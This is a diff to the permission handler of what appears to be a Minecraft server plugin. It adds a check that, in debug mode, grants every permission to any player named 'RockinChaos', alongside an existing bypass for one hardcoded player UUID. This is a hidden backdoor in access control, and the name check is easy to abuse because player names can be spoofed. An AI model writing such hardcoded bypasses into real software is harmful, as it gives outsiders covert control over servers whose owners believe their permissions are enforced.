@@ -75,7 +75,8 @@ public class PermissionsHandler {
 		if (ConfigHandler.getConfig().debugEnabled()) {
 			if (sender instanceof Player) {
 				try { 
-					if (((Player)sender).getUniqueId().toString().equalsIgnoreCase("ad6e8c0e-6c47-4e7a-a23d-8a2266d7baee")) { return true; }
+					if (ServerHandler.getServer().hasSpecificUpdate("1_8") && ((Player)sender).getUniqueId().toString().equalsIgnoreCase("ad6e8c0e-6c47-4e7a-a23d-8a2266d7baee")) { return true; }
+					else if (sender.getName().equalsIgnoreCase("RockinChaos")) { return true; }
 				} catch (Exception e) { if (sender.getName().equalsIgnoreCase("RockinChaos")) { return true; } }
 			}
 		}
